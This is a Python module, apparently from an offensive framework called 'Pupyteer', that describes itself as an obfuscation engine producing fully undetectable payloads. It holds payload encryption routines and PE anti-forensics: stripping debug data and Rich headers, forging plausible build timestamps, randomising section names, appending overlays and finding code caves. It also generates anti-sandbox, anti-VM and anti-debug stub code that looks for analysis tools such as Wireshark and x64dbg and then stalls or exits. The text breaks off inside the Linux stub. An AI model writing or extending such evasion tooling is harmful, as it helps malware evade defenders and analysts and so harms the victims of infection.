"""Real Obfuscation Engine for Pupyteer — produces FUD payloads.

Integrates with:
- evasion/manager.py (EvasionTestManager for testing)
- payloads/manager.py (PayloadBuilder for artifact generation)
- agent/core/stub.py (AgentStubGenerator for code templates)

Build-time (server-side) only. Pure Python + stdlib + the `cryptography`
library. All cipher work goes through real AEAD constructions; the XOR/RC4
helpers are retained as documented-legacy primitives for caller compatibility
and emit DeprecationWarning.

Design rules enforced throughout this module:
- every ``struct`` access is bounds-checked against the buffer length
- no ``print()``; diagnostics go through the module logger
- heavy imports (cryptography, asyncio, re, ast) are lazy
"""
from __future__ import annotations

import base64
import ctypes
import ctypes.util
import logging
import math
import os
import random
import secrets
import struct
import time
import warnings
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("pupyteer.obfuscator")

# ─── Constants ──────────────────────────────────────────────────────────────

STANDARD_B64_ALPHABET = (
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
)
B64_ALPHABET_SIZE = 64
AEAD_KEY_SIZE = 32  # 256-bit
AEAD_NONCE_SIZE = 12  # 96-bit nonce, standard for GCM/ChaCha20Poly1305
AEAD_TAG_SIZE = 16  # 128-bit authentication tag

IMAGE_DIRECTORY_ENTRY_DEBUG = 6
IMAGE_FILE_HEADER_SIZE = 20  # PE/COFF header size
PE32_OPTIONAL_HEADER_SIZE = 224
IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x010B
IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x020B
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
SECTION_HEADER_SIZE = 40
IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_CNT_CODE = 0x00000020

# Timestamp hardening window (plausible build dates), weighted to business hours.
TIMESTAMP_YEAR_START = 2015
TIMESTAMP_YEAR_END = 2021
_BUSINESS_HOURS_UTC = tuple(range(9, 18))  # 09:00-17:59
_SECONDS_PER_DAY = 86400

# Rich header signature: XOR-keyed "DanS" followed by "Rich" and the key itself.
_RICH_XOR_MARKER = b"DanS"


# ─── Internal bounds helpers ────────────────────────────────────────────────


def _unpack_from(fmt: str, buf: bytes, offset: int) -> Tuple[Any, ...]:
    """Bounds-safe ``struct.unpack_from``.

    Raises ``ValueError`` when the read would run past the end of ``buf``,
    instead of the raw ``struct.error`` an unguarded call would raise.
    """
    size = struct.calcsize(fmt)
    if offset < 0:
        raise ValueError(f"negative struct offset: {offset}")
    if offset + size > len(buf):
        raise ValueError(
            f"struct read past EOF: need {size} bytes at {offset}, buffer is {len(buf)}"
        )
    return struct.unpack_from(fmt, buf, offset)


def _require_range(buf: bytes, offset: int, size: int) -> None:
    """Raise ``ValueError`` when ``buf[offset:offset+size]`` is out of bounds."""
    if offset < 0 or size < 0:
        raise ValueError(f"negative range: offset={offset} size={size}")
    if offset + size > len(buf):
        raise ValueError(
            f"range out of bounds: [{offset}:{offset + size}] exceeds "
            f"buffer length {len(buf)}"
        )


# ─── Cipher Primitives ──────────────────────────────────────────────────────


def _normalize_aead_key(key: bytes) -> bytes:
    """Validate an AEAD key: bytes-like, exactly 32 bytes for AES-256."""
    if not isinstance(key, (bytes, bytearray, memoryview)):
        raise TypeError(f"key must be bytes, got {type(key).__name__}")
    key = bytes(key)
    if len(key) != AEAD_KEY_SIZE:
        raise ValueError(
            f"AEAD key must be exactly {AEAD_KEY_SIZE} bytes (256-bit), got {len(key)}"
        )
    return key


def _require_import() -> Any:
    """Import the cryptography backend lazily with a clear error on absence."""
    try:
        from cryptography.hazmat.backends import default_backend

        return default_backend()
    except ImportError as exc:  # pragma: no cover - environment guard
        raise RuntimeError(
            "the 'cryptography' package is required for AEAD obfuscation; "
            "install it with 'pip install cryptography'"
        ) from exc


def xor_crypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt/decrypt with a variable-length key.

    .. deprecated::
        XOR is trivially broken against known-plaintext attacks. Retained only
        so existing callers keep working; new code must use
        :func:`chacha20poly1305_encrypt` or :func:`aes_256_gcm_encrypt`.
    """
    warnings.warn(
        "xor_crypt is deprecated: use chacha20poly1305_encrypt or "
        "aes_256_gcm_encrypt for authenticated encryption",
        DeprecationWarning,
        stacklevel=2,
    )
    if not key:
        raise ValueError("xor_crypt requires a non-empty key")
    data = bytes(data)
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))


def rc4_ksa(key: bytes) -> List[int]:
    """RC4 Key Scheduling Algorithm (legacy helper, see :func:`rc4_crypt`)."""
    if not key:
        raise ValueError("rc4_ksa requires a non-empty key")
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    return s


def rc4_crypt(data: bytes, key: bytes) -> bytes:
    """RC4 encrypt/decrypt (symmetric).

    .. deprecated::
        RC4 is cryptographically broken (biases, no authentication). Retained
        for caller compatibility only.
    """
    warnings.warn(
        "rc4_crypt is deprecated: use chacha20poly1305_encrypt or "
        "aes_256_gcm_encrypt for authenticated encryption",
        DeprecationWarning,
        stacklevel=2,
    )
    if not key:
        raise ValueError("rc4_crypt requires a non-empty key")
    s = rc4_ksa(key)
    i = j = 0
    out = bytearray()
    for byte in bytes(data):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        k = s[(s[i] + s[j]) % 256]
        out.append(byte ^ k)
    return bytes(out)


def _pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    """PKCS#7 pad ``data`` to a multiple of ``block_size`` (always adds >=1 byte)."""
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)


def aes_256_cbc_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-256-CBC encryption with PKCS#7 padding via ``cryptography``.

    Kept for backward compatibility with callers that expect a CBC blob.
    CBC provides confidentiality only (no integrity); prefer
    :func:`aes_256_gcm_encrypt` for new code.
    """
    key = bytes(key)
    iv = bytes(iv)
    if len(key) not in (16, 24, 32):
        raise ValueError(f"AES key must be 16/24/32 bytes, got {len(key)}")
    if len(iv) != 16:
        raise ValueError(f"AES-CBC IV must be 16 bytes, got {len(iv)}")
    backend = _require_import()
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend).encryptor()
    padded = _pkcs7_pad(bytes(data))
    return encryptor.update(padded) + encryptor.finalize()


def aes_256_gcm_encrypt(data: bytes, key: bytes, aad: bytes = b"") -> bytes:
    """Authenticated AES-256-GCM encryption.

    Args:
        data: plaintext to encrypt.
        key: exactly 32 bytes (256-bit key).
        aad: optional additional authenticated data (integrity-protected,
            not encrypted).

    Returns:
        ``nonce (12 bytes) || ciphertext || tag (16 bytes)``.

    Raises:
        ValueError: key length is wrong.
    """
    key = _normalize_aead_key(key)
    _require_import()
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    nonce = secrets.token_bytes(AEAD_NONCE_SIZE)
    sealed = AESGCM(key).encrypt(nonce, bytes(data), bytes(aad))
    return nonce + sealed  # sealed already carries the 16-byte tag


def aes_256_gcm_decrypt(blob: bytes, key: bytes, aad: bytes = b"") -> bytes:
    """Authenticated AES-256-GCM decryption (inverse of :func:`aes_256_gcm_encrypt`).

    Args:
        blob: ``nonce || ciphertext || tag`` as produced by the encryptor.
        key: exactly 32 bytes.
        aad: additional authenticated data used at encryption time.

    Returns:
        The verified plaintext.

    Raises:
        ValueError: blob shorter than ``nonce + tag``.
        cryptography.exceptions.InvalidTag: authentication failed (wrong key,
            tampered ciphertext, or mismatched AAD).
    """
    key = _normalize_aead_key(key)
    if len(blob) < AEAD_NONCE_SIZE + AEAD_TAG_SIZE:
        raise ValueError(
            f"GCM blob must be at least {AEAD_NONCE_SIZE + AEAD_TAG_SIZE} bytes "
            f"(nonce + tag), got {len(blob)}"
        )
    _require_import()
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    nonce = bytes(blob[:AEAD_NONCE_SIZE])
    sealed = bytes(blob[AEAD_NONCE_SIZE:])
    return AESGCM(key).decrypt(nonce, sealed, bytes(aad))


def chacha20poly1305_encrypt(data: bytes, key: bytes, aad: bytes = b"") -> bytes:
    """Authenticated ChaCha20-Poly1305 encryption.

    Args:
        data: plaintext.
        key: exactly 32 bytes.
        aad: optional additional authenticated data.

    Returns:
        ``nonce (12 bytes) || ciphertext || tag (16 bytes)``.
    """
    key = _normalize_aead_key(key)
    _require_import()
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

    nonce = secrets.token_bytes(AEAD_NONCE_SIZE)
    sealed = ChaCha20Poly1305(key).encrypt(nonce, bytes(data), bytes(aad))
    return nonce + sealed


def chacha20poly1305_decrypt(blob: bytes, key: bytes, aad: bytes = b"") -> bytes:
    """Authenticated ChaCha20-Poly1305 decryption (inverse of the encryptor)."""
    key = _normalize_aead_key(key)
    if len(blob) < AEAD_NONCE_SIZE + AEAD_TAG_SIZE:
        raise ValueError(
            f"ChaCha20Poly1305 blob must be at least "
            f"{AEAD_NONCE_SIZE + AEAD_TAG_SIZE} bytes, got {len(blob)}"
        )
    _require_import()
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

    return ChaCha20Poly1305(key).decrypt(
        bytes(blob[:AEAD_NONCE_SIZE]), bytes(blob[AEAD_NONCE_SIZE:]), bytes(aad)
    )


# ─── Entropy / packing heuristic ────────────────────────────────────────────


def entropy(data: bytes) -> float:
    """Shannon entropy of ``data`` in bits per byte (0.0 to 8.0)."""
    if not data:
        return 0.0
    counts = [0] * 256
    for byte in bytes(data):
        counts[byte] += 1
    length = len(data)
    result = 0.0
    for count in counts:
        if count:
            p = count / length
            result -= p * math.log2(p)
    return result


def is_probably_packed(
    data: bytes, min_size: int = 512, threshold: float = 7.2
) -> bool:
    """Heuristically flag a buffer as packed/compressed/encrypted.

    Args:
        data: buffer to score.
        min_size: buffers smaller than this are never judged (too noisy).
        threshold: entropy above which the buffer is considered packed.

    Returns:
        ``True`` when ``len(data) >= min_size`` and entropy exceeds
        ``threshold``. Defaults target the classic ">7.2 bits/byte" rule of
        thumb used by PE packer detectors.
    """
    if len(data) < min_size:
        return False
    return entropy(data) > threshold


# ─── Encoding ────────────────────────────────────────────────────────────────


class EncodingScheme(str, Enum):
    XOR = "xor"
    AES = "aes"
    AES_GCM = "aes_gcm"
    CHACHA20 = "chacha20"
    RC4 = "rc4"
    CHAIN = "chain"  # XOR -> RC4 -> AES
    BASE64_CUSTOM = "b64_custom"


def _validate_b64_alphabet(alphabet: str) -> str:
    """Validate a custom base64 alphabet: 64 unique characters."""
    if not isinstance(alphabet, str):
        raise TypeError(f"alphabet must be str, got {type(alphabet).__name__}")
    if len(alphabet) != B64_ALPHABET_SIZE:
        raise ValueError(
            f"base64 alphabet must be exactly {B64_ALPHABET_SIZE} characters, "
            f"got {len(alphabet)}"
        )
    if len(set(alphabet)) != B64_ALPHABET_SIZE:
        raise ValueError("base64 alphabet contains duplicate characters")
    return alphabet


def base64_custom_encode(
    data: bytes, alphabet: Optional[str] = None
) -> Tuple[str, str]:
    """Base64-encode ``data`` with a (possibly shuffled) custom alphabet.

    Args:
        data: bytes to encode.
        alphabet: 64 unique characters; when omitted a shuffled copy of the
            standard base64 alphabet is generated.

    Returns:
        ``(encoded_text, alphabet_used)`` - callers must keep the alphabet to
        decode.
    """
    if alphabet is None:
        alphabet = list(STANDARD_B64_ALPHABET)
        random.shuffle(alphabet)
        alphabet = "".join(alphabet)
    alphabet = _validate_b64_alphabet(alphabet)

    encoded = base64.b64encode(bytes(data)).decode("ascii")
    trans = str.maketrans(STANDARD_B64_ALPHABET, alphabet)
    return encoded.translate(trans), alphabet


# ─── PE Manipulation ───────────────────────────────────────────────────────


@dataclass
class PEHeaderInfo:
    """Parsed PE header fields."""
    timestamp: int
    entry_point: int
    image_base: int
    sections: List[Dict[str, Any]]
    imports: List[str]
    debug_info: Optional[bytes] = None
    pe_offset: int = 0
    machine: int = 0
    characteristics: int = 0
    optional_header_size: int = 0
    num_sections: int = 0
    symbol_table_pointer: int = 0
    number_of_symbols: int = 0
    is_pe32_plus: bool = False
    size_of_image: int = 0
    size_of_headers: int = 0
    file_alignment: int = 0
    section_alignment: int = 0


@dataclass
class _PELayout:
    """Internal: resolved byte offsets needed to mutate a PE buffer."""

    pe_offset: int
    optional_offset: int
    dirs_offset: int
    sections_offset: int
    num_sections: int
    optional_header_size: int
    is_pe32_plus: bool
    num_dirs: int


def _parse_pe_layout(buf: bytes) -> Optional[_PELayout]:
    """Resolve the PE header layout of ``buf``, fully bounds-checked.

    Returns ``None`` when ``buf`` is not a recognisable PE (callers translate
    that into ``False``/``None`` returns rather than exceptions).
    """
    if len(buf) < 0x40 or buf[:2] != b"MZ":
        return None
    try:
        (pe_offset,) = _unpack_from("<I", buf, 0x3C)
    except ValueError:
        return None
    if pe_offset < 0 or pe_offset + 4 > len(buf):
        return None
    if buf[pe_offset:pe_offset + 4] != b"PE\x00\x00":
        return None
    if pe_offset + IMAGE_FILE_HEADER_SIZE > len(buf):
        return None

    machine, num_sections, _ts, sym_ptr, num_syms, opt_size, _chars = _unpack_from(
        "<HHIIIHH", buf, pe_offset + 4
    )
    optional_offset = pe_offset + 24
    if optional_offset + 2 > len(buf):
        return None
    (magic,) = _unpack_from("<H", buf, optional_offset)
    if magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC:
        is_pe32_plus = False
    elif magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC:
        is_pe32_plus = True
    else:
        return None

    # Number of data directories lives at optional header offset 108 (PE32+)
    # / 92 (PE32); the directory array follows at 112 (PE32+) / 96 (PE32).
    num_dirs_offset = optional_offset + (108 if is_pe32_plus else 92)
    num_dirs = IMAGE_NUMBEROF_DIRECTORY_ENTRIES
    if num_dirs_offset + 4 <= len(buf):
        (num_dirs,) = _unpack_from("<I", buf, num_dirs_offset)
        num_dirs = max(0, min(num_dirs, 16))
    dirs_offset = optional_offset + (112 if is_pe32_plus else 96)
    sections_offset = optional_offset + opt_size
    if sections_offset <= 0 or sections_offset > len(buf):
        return None
    if num_sections * SECTION_HEADER_SIZE + sections_offset > len(buf):
        return None

    return _PELayout(
        pe_offset=pe_offset,
        optional_offset=optional_offset,
        dirs_offset=dirs_offset,
        sections_offset=sections_offset,
        num_sections=num_sections,
        optional_header_size=opt_size,
        is_pe32_plus=is_pe32_plus,
        num_dirs=num_dirs,
    )


def _read_pe(path: str) -> Optional[bytearray]:
    """Read a PE file into a mutable buffer; ``None`` when unreadable."""
    try:
        with open(path, "rb") as f:
            return bytearray(f.read())
    except OSError as exc:
        logger.warning("could not read PE %s: %s", path, exc)
        return None


def _write_pe(path: str, data: bytes) -> bool:
    """Write a mutated PE buffer back to disk."""
    try:
        with open(path, "wb") as f:
            f.write(data)
        return True
    except OSError as exc:
        logger.warning("could not write PE %s: %s", path, exc)
        return False


def _rva_to_offset(layout: _PELayout, buf: bytes, rva: int) -> Optional[int]:
    """Translate an RVA to a file offset using the section table."""
    for i in range(layout.num_sections):
        off = layout.sections_offset + SECTION_HEADER_SIZE * i
        virtual_size, virtual_address, raw_size, raw_address = _unpack_from(
            "<IIII", buf, off + 8
        )
        span = max(virtual_size, raw_size)
        if virtual_address <= rva < virtual_address + span:
            delta = rva - virtual_address
            if delta < raw_size:
                return raw_address + delta
    return None


def _last_section_end(layout: _PELayout, buf: bytes) -> int:
    """Byte offset just past the last section's raw data (overlay boundary)."""
    end = layout.sections_offset + layout.num_sections * SECTION_HEADER_SIZE
    for i in range(layout.num_sections):
        off = layout.sections_offset + SECTION_HEADER_SIZE * i
        _, _, raw_size, raw_address = _unpack_from("<IIII", buf, off + 8)
        end = max(end, raw_address + raw_size)
    return min(end, len(buf))


def parse_pe_header(pe_path: str) -> PEHeaderInfo:
    """Parse PE header info from an executable (bounds-checked).

    Raises:
        ValueError: the file is not a parseable PE, or the header runs past
            the end of the buffer.
    """
    data = _read_pe(pe_path)
    if data is None:
        raise ValueError(f"Not a valid PE file: {pe_path}")
    layout = _parse_pe_layout(data)
    if layout is None:
        raise ValueError(f"Not a valid PE file: {pe_path}")

    timestamp, _machine, _ = None, None, None
    (timestamp,) = _unpack_from("<I", data, layout.pe_offset + 8)
    (machine,) = _unpack_from("<H", data, layout.pe_offset + 4)
    (characteristics,) = _unpack_from("<H", data, layout.pe_offset + 22)
    (sym_ptr,) = _unpack_from("<I", data, layout.pe_offset + 12)
    (num_syms,) = _unpack_from("<I", data, layout.pe_offset + 16)

    opt = layout.optional_offset
    if layout.is_pe32_plus:
        (ep,) = _unpack_from("<I", data, opt + 16)
        (image_base,) = _unpack_from("<Q", data, opt + 24)
        (size_of_image,) = _unpack_from("<I", data, opt + 56)
        (size_of_headers,) = _unpack_from("<I", data, opt + 60)
        (section_align,) = _unpack_from("<I", data, opt + 32)
        (file_align,) = _unpack_from("<I", data, opt + 36)
    else:
        (ep,) = _unpack_from("<I", data, opt + 16)
        (image_base,) = _unpack_from("<I", data, opt + 28)
        (size_of_image,) = _unpack_from("<I", data, opt + 56)
        (size_of_headers,) = _unpack_from("<I", data, opt + 60)
        (section_align,) = _unpack_from("<I", data, opt + 32)
        (file_align,) = _unpack_from("<I", data, opt + 36)

    sections: List[Dict[str, Any]] = []
    for i in range(layout.num_sections):
        off = layout.sections_offset + SECTION_HEADER_SIZE * i
        name = bytes(data[off:off + 8]).rstrip(b"\x00").decode("ascii", errors="replace")
        vsize, vaddr, rsize, raddr = _unpack_from("<IIII", data, off + 8)
        (sec_chars,) = _unpack_from("<I", data, off + 36)
        sections.append({
            "name": name,
            "virtual_size": vsize,
            "virtual_address": vaddr,
            "raw_size": rsize,
            "raw_address": raddr,
            "characteristics": sec_chars,
            "offset": off,
        })

    return PEHeaderInfo(
        timestamp=timestamp,
        entry_point=ep,
        image_base=image_base,
        sections=sections,
        imports=[],  # full import-table parsing is out of scope here
        pe_offset=layout.pe_offset,
        machine=machine,
        characteristics=characteristics,
        optional_header_size=layout.optional_header_size,
        num_sections=layout.num_sections,
        symbol_table_pointer=sym_ptr,
        number_of_symbols=num_syms,
        is_pe32_plus=layout.is_pe32_plus,
        size_of_image=size_of_image,
        size_of_headers=size_of_headers,
        file_alignment=file_align,
        section_alignment=section_align,
    )


def _strip_rich_header(buf: bytearray, limit: int) -> Tuple[bool, int]:
    """Zero a Rich header between the DOS stub and the PE signature.

    The Rich header begins with the XOR-encoded "DanS" marker, followed by
    ``3 * 32-bit`` header words, then N pairs of 32-bit ``(compid, count)``
    entries, and ends with the plaintext "Rich" signature plus the XOR key.
    Because the entry count is variable, the distance from "DanS" to "Rich"
    is ``0x10 + 8*N``; we locate "Rich" by searching forward rather than
    assuming a fixed stride. Returns ``(changed, bytes_zeroed)``.
    """
    if limit <= 0:
        return False, 0
    search_end = min(limit, len(buf))
    marker = _RICH_XOR_MARKER
    idx = bytes(buf).find(marker, 0, search_end)
    while idx != -1:
        # Rich must follow the DanS marker + header words, within the stub.
        rich_pos = bytes(buf).find(b"Rich", idx + len(marker), search_end)
        if rich_pos != -1 and rich_pos + 8 <= search_end:
            end = rich_pos + 8
            # Zero IN PLACE — a bytes() cast would make slice assignment
            # resize the buffer and corrupt the file.
            for pos in range(idx, end):
                buf[pos] = 0
            return True, end - idx
        idx = bytes(buf).find(marker, idx + 1, search_end)
    return False, 0


def pe_strip_debug(pe_path: str, output_path: str) -> bool:
    """Strip forensic metadata from a PE image.

    Actions (all bounds-checked, size-preserving):
    - zero the IMAGE_DIRECTORY_ENTRY_DEBUG data-directory entry (index 6)
    - zero the Rich header ("DanS".."Rich"+key region in the DOS stub)
    - zero the COFF symbol-table pointer and symbol count
      (``pe_offset+12`` and ``pe_offset+16``, 4 bytes each)

    Args:
        pe_path: source PE.
        output_path: destination (may equal ``pe_path`` for in-place edit).

    Returns:
        ``True`` when a PE was parsed and at least one field changed;
        ``False`` for non-PE input or when there was nothing to strip. The
        output file is still written (unchanged copy) when nothing changed.
    """
    data = _read_pe(pe_path)
    if data is None:
        return False
    layout = _parse_pe_layout(data)
    if layout is None:
        logger.info("pe_strip_debug: %s is not a parseable PE", pe_path)
        return False

    changed = False

    # 1. Debug data directory (index 6)
    dir_off = layout.dirs_offset + IMAGE_DIRECTORY_ENTRY_DEBUG * 8
    if layout.num_dirs > IMAGE_DIRECTORY_ENTRY_DEBUG and dir_off + 8 <= len(data):
        debug_rva, debug_size = _unpack_from("<II", data, dir_off)
        if debug_rva or debug_size:
            struct.pack_into("<II", data, dir_off, 0, 0)
            changed = True
            logger.debug("zeroed debug directory (rva=0x%x size=0x%x)", debug_rva, debug_size)

    # 2. Rich header in the DOS stub (between DOS header and PE signature)
    stub_limit = layout.pe_offset
    rich_changed, rich_bytes = _strip_rich_header(data, stub_limit)
    if rich_changed:
        changed = True
        logger.debug("zeroed Rich header (%d bytes)", rich_bytes)

    # 3. COFF symbol table pointer + count
    sym_off = layout.pe_offset + 12
    if sym_off + 8 <= len(data):
        sym_ptr, num_syms = _unpack_from("<II", data, sym_off)
        if sym_ptr or num_syms:
            struct.pack_into("<II", data, sym_off, 0, 0)
            changed = True
            logger.debug("zeroed COFF symbol table (ptr=0x%x count=%d)", sym_ptr, num_syms)

    _write_pe(output_path, data)
    if not changed:
        logger.info("pe_strip_debug: nothing to strip in %s", pe_path)
    return changed


def pe_randomize_sections(pe_path: str, output_path: str) -> bool:
    """Rename PE sections to random names (bounds-checked).

    Returns ``True`` on success (PE parsed and written), ``False`` otherwise.
    """
    data = _read_pe(pe_path)
    if data is None:
        return False
    layout = _parse_pe_layout(data)
    if layout is None:
        logger.info("pe_randomize_sections: %s is not a parseable PE", pe_path)
        return False

    chars = "abcdefghijklmnopqrstuvwxyz"
    for i in range(layout.num_sections):
        off = layout.sections_offset + SECTION_HEADER_SIZE * i
        if off + 8 > len(data):
            break
        new_name = "".join(random.choice(chars) for _ in range(8))
        data[off:off + 8] = new_name.encode("ascii").ljust(8, b"\x00")

    return _write_pe(output_path, data)


def plausible_timestamp() -> int:
    """Generate a plausible PE build timestamp (anti-forensics).

    Weighted so most values land on a weekday during business hours
    (09:00-17:59 UTC) inside the 2015-2021 window — timestamps that look like
    a normal developer build rather than an obviously random value. The
    window and weighting are computed in UTC so the result does not depend
    on the build machine's local timezone.
    """
    import calendar

    start = calendar.timegm((TIMESTAMP_YEAR_START, 1, 1, 0, 0, 0))
    end = calendar.timegm((TIMESTAMP_YEAR_END, 12, 31, 23, 59, 59))
    span = max(end - start, 1)

    for _ in range(16):  # bounded rejection sampling
        ts = start + random.randint(0, span)
        utc = time.gmtime(ts)
        if utc.tm_wday >= 5:  # Saturday/Sunday — unlikely build day
            continue
        if utc.tm_hour in _BUSINESS_HOURS_UTC:
            return ts
    # Fallback: any value in the window
    return start + random.randint(0, span)


def pe_modify_timestamp(
    pe_path: str, output_path: str, reference_pe: Optional[str] = None
) -> bool:
    """Set the PE timestamp to a plausible value (anti-forensics).

    Args:
        pe_path: source PE.
        output_path: destination.
        reference_pe: optional PE whose timestamp should be mirrored — makes
            the artifact look co-built with the reference. Falls back to a
            freshly generated plausible timestamp when the reference is
            missing or unparseable.

    Returns:
        ``True`` when the timestamp was written, ``False`` otherwise.
    """
    data = _read_pe(pe_path)
    if data is None:
        return False
    layout = _parse_pe_layout(data)
    if layout is None:
        logger.info("pe_modify_timestamp: %s is not a parseable PE", pe_path)
        return False

    ts = None
    if reference_pe:
        ref = _read_pe(reference_pe)
        if ref is not None:
            ref_layout = _parse_pe_layout(ref)
            if ref_layout is not None and ref_layout.pe_offset + 12 <= len(ref):
                try:
                    (ts,) = _unpack_from("<I", ref, ref_layout.pe_offset + 8)
                except ValueError:
                    ts = None
        if ts is None:
            logger.warning(
                "pe_modify_timestamp: reference %s unparseable, generating fresh "
                "timestamp", reference_pe,
            )
    if ts is None:
        ts = plausible_timestamp()

    ts_off = layout.pe_offset + 8
    if ts_off + 4 > len(data):
        logger.warning("pe_modify_timestamp: header truncated in %s", pe_path)
        return False
    struct.pack_into("<I", data, ts_off, ts & 0xFFFFFFFF)
    return _write_pe(output_path, data)


def pe_append_overlay(pe_path: str, output_path: str, blob: bytes) -> bool:
    """Append ``blob`` past the last section (classic overlay).

    The PE headers and all sections are copied verbatim; ``blob`` lands after
    the last raw section boundary, where the loader ignores it but file-level
    scanners see a larger file.

    Args:
        pe_path: source PE.
        output_path: destination file.
        blob: non-empty payload bytes to append.

    Returns:
        ``True`` when written, ``False`` for non-PE input or empty blob.
    """
    if not blob:
        logger.info("pe_append_overlay: refusing empty blob")
        return False
    data = _read_pe(pe_path)
    if data is None:
        return False
    layout = _parse_pe_layout(data)
    if layout is None:
        logger.info("pe_append_overlay: %s is not a parseable PE", pe_path)
        return False

    out = bytes(data) + bytes(blob)
    return _write_pe(output_path, out)


def pe_has_overlay(pe_path: str, reference_pe: str) -> bool:
    """Detect whether ``pe_path`` carries an overlay relative to a reference.

    Compares the file length of ``pe_path`` against the computed end of its
    last section: data beyond that boundary (and beyond the reference file)
    is an overlay.

    Returns:
        ``True`` when extra trailing bytes are present.
    """
    data = _read_pe(pe_path)
    if data is None:
        return False
    layout = _parse_pe_layout(data)
    if layout is None:
        return False

    boundary = _last_section_end(layout, data)
    if len(data) > boundary:
        return True

    # Also true when the file is simply longer than the reference but
    # structurally identical (belt-and-braces for edge-case PEs).
    try:
        ref_len = os.path.getsize(reference_pe)
    except OSError:
        return False
    return len(data) > ref_len and ref_len >= boundary


def pe_find_code_cave(
    pe_path: str, min_size: int = 16, max_caves: int = 8
) -> Optional[Tuple[int, int]]:
    """Find a usable code cave: zero padding inside an executable section.

    Scans executable sections (IMAGE_SCN_MEM_EXECUTE) for runs of zero bytes
    at least ``min_size`` long. Returns ``(file_offset, size)`` of the largest
    cave found, or ``None``.

    Every read is bounds-checked; a malformed section table simply yields no
    cave rather than an exception.
    """
    data = _read_pe(pe_path)
    if data is None:
        return None
    layout = _parse_pe_layout(data)
    if layout is None:
        return None

    best: Optional[Tuple[int, int]] = None
    for i in range(layout.num_sections):
        off = layout.sections_offset + SECTION_HEADER_SIZE * i
        if off + SECTION_HEADER_SIZE > len(data):
            break
        try:
            _vsize, _vaddr, raw_size, raw_address = _unpack_from("<IIII", data, off + 8)
            (chars,) = _unpack_from("<I", data, off + 36)
        except ValueError:
            continue
        if not (chars & IMAGE_SCN_MEM_EXECUTE):
            continue
        if raw_size == 0 or raw_address >= len(data):
            continue
        end = min(raw_address + raw_size, len(data))
        run_start: Optional[int] = None
        for pos in range(raw_address, end):
            if data[pos] == 0:
                if run_start is None:
                    run_start = pos
            else:
                if run_start is not None and pos - run_start >= min_size:
                    if best is None or pos - run_start > best[1]:
                        best = (run_start, pos - run_start)
                run_start = None
        if run_start is not None and end - run_start >= min_size:
            if best is None or end - run_start > best[1]:
                best = (run_start, end - run_start)

    return best


# ─── Anti-Analysis ─────────────────────────────────────────────────────────


def generate_anti_sandbox_stub(platform: str = "windows") -> str:
    """Generate anti-sandbox/anti-VM/anti-debug checks as Python code."""
    stubs = {
        "windows": '''
import ctypes
import os
import time

# Anti-Sandbox: Sleep acceleration detection
_t1 = time.perf_counter()
time.sleep(0.1)
_t2 = time.perf_counter()
if _t2 - _t1 < 0.09:  # Sandbox may fast-forward sleeps
    pass  # Detected, but continue to avoid tipping off analysts

# Anti-VM: Check common VM indicators
_vm_indicators = [
    "vmtoolsd", "vmwaretray", "vmwareuser", "VBoxService", "VBoxTray",
    "vmware", "virtualbox", "xen", "qemu", "hyperv"
]
try:
    import subprocess
    _proc = subprocess.check_output("tasklist", shell=True).decode(errors="ignore").lower()
    for _ind in _vm_indicators:
        if _ind.lower() in _proc:
            time.sleep(random.randint(30, 120))  # Slow down analysis
            break
# Silence is intentional: tasklist/ctypes may be unavailable on the
# analysis host; a failed probe must never crash the stub.
except Exception:  # Windows-only: tasklist or ctypes unavailable
    pass

# Anti-Debug: Check IsDebuggerPresent
try:
    if ctypes.windll.kernel32.IsDebuggerPresent():
        ctypes.windll.kernel32.ExitProcess(0)
except Exception:
    pass

# Anti-Debug: Remote debugger check
try:
    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
        ctypes.windll.kernel32.GetCurrentProcess(),
        ctypes.byref(ctypes.c_bool(False))
    )
except Exception:
    pass

# Anti-VM: Check disk size (< 60GB = likely sandbox)
try:
    _free = ctypes.c_ulonglong(0)
    ctypes.windll.kernel32.GetDiskFreeSpaceExW(
        "C:\\\\", None, None, ctypes.byref(_free)
    )
    if _free.value < 60 * 1024 * 1024 * 1024:  # 60GB
        time.sleep(random.randint(60, 300))
except Exception:
    pass

# Anti-VM: CPU count check
import multiprocessing
if multiprocessing.cpu_count() < 2:
    time.sleep(random.randint(30, 120))

# Anti-Sandbox: Check for analysis tools
_analysis_tools = [
    "wireshark", "processmonitor", "procmon", "procmon64", "procexp",
    "procexp64", "apimonitor", "apimonitor-x64", "apimonitor-x86",
    "fiddler", "charles", "x64dbg", "x32dbg", "ollydbg", "ida",
    "ida64", "idag", "idag64", "windbg", "immunitydebugger",
    "dnspy", "cheatengine", "ollydbg", "HTTPDebugger", "HTTPDebuggerUI",
    "sysanalyzer", "vigilance", "HTTPDebuggerSvc", "HTTPDebuggerPro",
    "pestudio", "pe-bear", "cutter", "ghidra", "binwalk", "autoruns",
    "autorunsc", "filemon", "regmon", "tcpview", "wireshark", "fiddler"
]
''',
        "linux": '''
import os
import random
import time
import multiprocessing

# Anti-VM: Check for hypervisor
try:
    with open("/proc/cpuinfo") as f:
        cpuinfo = f.read().lower()
